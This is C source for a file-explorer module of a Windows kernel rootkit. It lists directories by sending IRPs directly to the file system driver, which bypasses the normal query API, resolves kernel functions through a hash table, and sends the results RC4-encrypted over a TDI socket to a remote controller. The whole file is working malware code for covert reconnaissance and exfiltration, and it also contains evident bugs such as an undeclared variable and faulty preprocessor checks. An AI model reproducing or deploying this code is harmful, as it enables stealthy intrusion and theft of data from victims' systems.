#include "common.h"


/*
	File: file.c

	Implementation of a file explorer
	calling the underlying driver directly 
	instead of calling ZwQueryDirectoryFile

	returns
	 File Last Write Time
	 File Creation Time
	 Filename

*/

NTSTATUS QueryCompletion(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp, IN PVOID Context)
{
	PIO_STATUS_BLOCK ioStatus;

	ioStatus = Irp->UserIosb;
	ioStatus->Status = Irp->IoStatus.Status;
	ioStatus->Information = Irp->IoStatus.Information;

	g_Hash._KeSetEvent(Irp->UserEvent, 0, FALSE);
	g_Hash._IoFreeIrp(Irp);

	return STATUS_MORE_PROCESSING_REQUIRED;
}

PROOTKIT_FILEEXPLORER_LIST_HEAD kernel_get_number_files(IN PCHAR FileName, IN PROOTKIT_API_HASH Hash)
{
	NTSTATUS st;
	PIRP Irp;
	KEVENT Event;
	PFILE_BOTH_DIR_INFORMATION bothdirinformation = NULL;
	PVOID Buffer = NULL;
	IO_STATUS_BLOCK io = { 0 };
	HANDLE handle;
	PIO_STACK_LOCATION pio;
	OBJECT_ATTRIBUTES oa = { 0 };
	UNICODE_STRING ustr0 = { 0 };
	ANSI_STRING ansi = { 0 };
	PFILE_OBJECT FileObject = NULL;
	PDEVICE_OBJECT DeviceObject = NULL;
	PROOTKIT_FILEEXPLORER_ENTRY EntryBuffer = NULL;
	TIME_FIELDS timer = { 0 };
	TIME_FIELDS wtime = { 0 };
	SIZE_T ByteChecker = 0;
	EX_RUNDOWN_REF protect;


	g_fileexplorer_head = (PROOTKIT_FILEEXPLORER_LIST_HEAD)Hash->_ExAllocatePool(NonPagedPool, sizeof(ROOTKIT_FILEEXPLORER_LIST_HEAD));
	if (g_fileexplorer_head == NULL)
		KdPrint(("\r\nError allocating list-head"));


	InitializeListHead(&g_fileexplorer_head->Entry);
	g_fileexplorer_head->NumberOfElements = 0;

	Hash->_RtlInitAnsiString(&ansi, FileName);
	Hash->_RtlAnsiStringToUnicodeString(&ustr0, &ansi, TRUE);
	InitializeObjectAttributes(&oa, &ustr0, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);

#ifndef _WIN64 && WINVER == _WIN32_WINNT_WIN7
	st = MyIopCreateFile(&handle, \
		FILE_LIST_DIRECTORY |
		SYNCHRONIZE |
		FILE_ANY_ACCESS, \
		&oa, \
		&io, \
		0, \
		FILE_ATTRIBUTE_NORMAL, \
		FILE_SHARE_DELETE |
		FILE_SHARE_WRITE |
		FILE_SHARE_READ, \
		FILE_OPEN, \
		FILE_DIRECTORY_FILE |
		FILE_SYNCHRONOUS_IO_ALERT, \
		NULL, \
		0, \
		CreateFileTypeNone, \
		NULL, \
		IO_NO_PARAMETER_CHECKING, \
		0, \
		NULL);

#else

	st = IoCreateFileEx(&handle, FILE_READ_ATTRIBUTES, &oa, &io, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_DELETE, FILE_OPEN,
		FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0, CreateFileTypeNone, NULL, IO_NO_PARAMETER_CHECKING, 0, NULL);

#endif

	if (!NT_SUCCESS(st))

#ifndef _WIN64
		ObpCloseHandle(handle, KernelMode);
#else
		ZwClose(handle);
#endif

	st = Hash->_ObReferenceObjectByHandle(handle, FILE_LIST_DIRECTORY | SYNCHRONIZE, *g_Hash._IoFileObjectType,
		KernelMode, (PVOID*)&FileObject, NULL);
	if (!NT_SUCCESS(st))
		Hash->_ObfDereferenceObject(FileObject);

	DeviceObject =Hash->_IoGetRelatedDeviceObject(FileObject);
	if (DeviceObject == NULL)
		KdPrint(("\r\nError IoGetRelatedDeviceObject"));


	Irp =Hash->_IoAllocateIrp(DeviceObject->StackSize, FALSE);
	if (Irp == NULL)
		return STATUS_INSUFFICIENT_RESOURCES;


	Hash->_KeInitializeEvent(&Event, NotificationEvent, FALSE);
	Buffer = Hash->_ExAllocatePool(NonPagedPool, 65530);

	Irp->UserEvent = &Event;
	Irp->UserBuffer = Buffer;
	Irp->AssociatedIrp.SystemBuffer = Buffer;
	Irp->MdlAddress = NULL;
	Irp->Flags = 0;
	Irp->UserIosb = &io;
	Irp->Tail.Overlay.OriginalFileObject = FileObject;
	Irp->Tail.Overlay.Thread = (PKTHREAD)Hash->_KeGetCurrentThread();
	Irp->RequestorMode = KernelMode;

	pio = Irp->Tail.Overlay.CurrentStackLocation - 1;
	pio->MajorFunction = IRP_MJ_DIRECTORY_CONTROL;
	pio->MinorFunction = IRP_MN_QUERY_DIRECTORY;
	pio->FileObject = FileObject;
	pio->DeviceObject = DeviceObject;
	pio->Flags = SL_RESTART_SCAN;
	pio->Control = 0;
	pio->Parameters.QueryDirectory.FileIndex = 0;
	pio->Parameters.QueryDirectory.FileInformationClass = FileBothDirectoryInformation;
	pio->Parameters.QueryDirectory.FileName = NULL;
	pio->Parameters.QueryDirectory.Length = 65530;

	IoSetCompletionRoutine(Irp, QueryCompletion, NULL, TRUE, TRUE, TRUE);

	st = Hash->_IofCallDriver(DeviceObject, Irp);
	if (st == STATUS_PENDING)
		Hash->_KeWaitForSingleObject(&Event, Executive, KernelMode, TRUE, NULL);


	bothdirinformation = (PFILE_BOTH_DIR_INFORMATION)Buffer;
	if (!bothdirinformation || !Hash->_MmIsAddressValid(bothdirinformation))
	{
		KdPrint(("\r\nError copying memory to structure"));
		return STATUS_UNSUCCESSFUL;
	}

	for (;;)
	{

		if ((bothdirinformation->FileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
			(bothdirinformation->FileName)[0] == L'.') goto exit;

		EntryBuffer = (PROOTKIT_FILEEXPLORER_ENTRY)g_Hash._ExAllocatePool(NonPagedPool, sizeof(ROOTKIT_FILEEXPLORER_ENTRY));
		memset(EntryBuffer, 0, sizeof(ROOTKIT_FILEEXPLORER_ENTRY));

		kimemcpy(EntryBuffer->FileName, bothdirinformation->FileName, bothdirinformation->FileNameLength);


		Hash->_RtlTimeToTimeFields(&bothdirinformation->CreationTime, &timer);
		Hash->_sprintf_s(EntryBuffer->CreateTime, 255, "%02u/%02u/%03u %02u:%02u:%02u", timer.Day, \
			timer.Month, \
			timer.Year, \
			timer.Hour, \
			timer.Minute, \
			timer.Second);
		Hash->_RtlTimeToTimeFields(&bothdirinformation->LastWriteTime, &wtime);
		Hash->_sprintf_s(EntryBuffer->WriteTime, 255, "%02u/%02u/%03u %02u:%02u:%02u", wtime.Day, \
			wtime.Month, \
			wtime.Year, \
			wtime.Hour, \
			wtime.Minute, \
			wtime.Second);

		Hash->_KfAcquireSpinLock(&g_globalspinlock);
		InsertTailList(&g_fileexplorer_head->Entry, &EntryBuffer->Entry);
		Hash->_KfReleaseSpinLock(&g_globalspinlock, Irql);

		g_fileexplorer_head->NumberOfElements++;


	exit:
		if (bothdirinformation->NextEntryOffset == 0) break;
		bothdirinformation = \
			(PFILE_BOTH_DIR_INFORMATION)((ULONG)bothdirinformation + \
			bothdirinformation->NextEntryOffset);

	}

	Hash->_ExFreePoolWithTag(Buffer,0);

#ifndef _WIN64
	ObpCloseHandle(handle, KernelMode);
#else
	ZwClose(handle);
#endif

	Hash->_ObfDereferenceObject(FileObject);
	Hash->_RtlFreeUnicodeString(&ustr0);

	return g_fileexplorer_head;
}

ULONG rk_copy_fileexplorer_list_to_buffer(IN PROOTKIT_FILEEXPLORER_ENTRY Buffer, IN PROOTKIT_API_HASH Hash)
{
	ULONG returnedlength = 0;
	PROOTKIT_FILEEXPLORER_ENTRY Entry = NULL;
	SIZE_T ByteChecker = 0;

	if (g_fileexplorer_head == NULL)
		return 0;

	Hash->_KfAcquireSpinLock(&g_globalspinlock);

	while (!IsListEmpty(&g_fileexplorer_head->Entry)) 
	{
		Entry = (PROOTKIT_FILEEXPLORER_ENTRY)RemoveTailList(&g_fileexplorer_head->Entry);
		kimemcpy(Buffer, Entry, sizeof(ROOTKIT_FILEEXPLORER_ENTRY));
		Hash->_ExFreePoolWithTag(Entry, 0);
		Buffer++;
		returnedlength++;
	}
	
	Hash->_KfReleaseSpinLock(&g_globalspinlock, Irql);

	Hash->_ExFreePoolWithTag(g_fileexplorer_head,0);
	g_fileexplorer_head = NULL;

	return returnedlength*sizeof(ROOTKIT_FILEEXPLORER_ENTRY);
}

BOOLEAN rk_send_fileexplorer_to_userspace(IN PFILE_OBJECT socket, IN PCHAR FileName, IN PROOTKIT_API_HASH Hash)
{
	ULONG bytes = 0;
	INT sendsize = 0;
	PROOTKIT_FILEEXPLORER_LIST_HEAD listhead = NULL;
	PROOTKIT_FILEEXPLORER_ENTRY Entry = NULL;
	PVOID Buffer = NULL;
	ULONG returnedbytes = 0;
	NTSTATUS st;
	PMDL Mdl = NULL;
	BOOLEAN g_cond = FALSE;

	listhead = kernel_get_number_files(FileName, Hash);
	bytes = listhead->NumberOfElements*sizeof(ROOTKIT_FILEEXPLORER_ENTRY);

	do
	{
		sendsize = send(socket, (char*)&bytes, sizeof(ULONG));
		if (sendsize > 0)
		{
			Buffer = KiAllocateMappedVirtualMemory(bytes, 'kbot', &Mdl, Hash);
			if (Buffer && Hash->_MmIsAddressValid(Buffer) && KiIsMdlAdddressValid(Mdl,Hash) == TRUE)
			{
				Entry = (PROOTKIT_FILEEXPLORER_ENTRY)Buffer;
				if (Entry && Hash->_MmIsAddressValid(Entry))
				{
					returnedbytes = rk_copy_fileexplorer_list_to_buffer(Entry, Hash);
					if (returnedbytes > 0)
					{
						sendsize = tdi_send_crypted(socket, RC4_KEY_2, (PROOTKIT_FILEEXPLORER_ENTRY)Entry, returnedbytes, 0);
						if (sendsize > 0)
						{
							g_cond = TRUE;
							goto clean;
						}
					}
				}
			}
		}

	} while (FALSE);

clean:
	KiFreeMappedVirtualMemory(Buffer, 'kbot', Mdl, Hash);
	Buffer = NULL;

	return g_cond;
}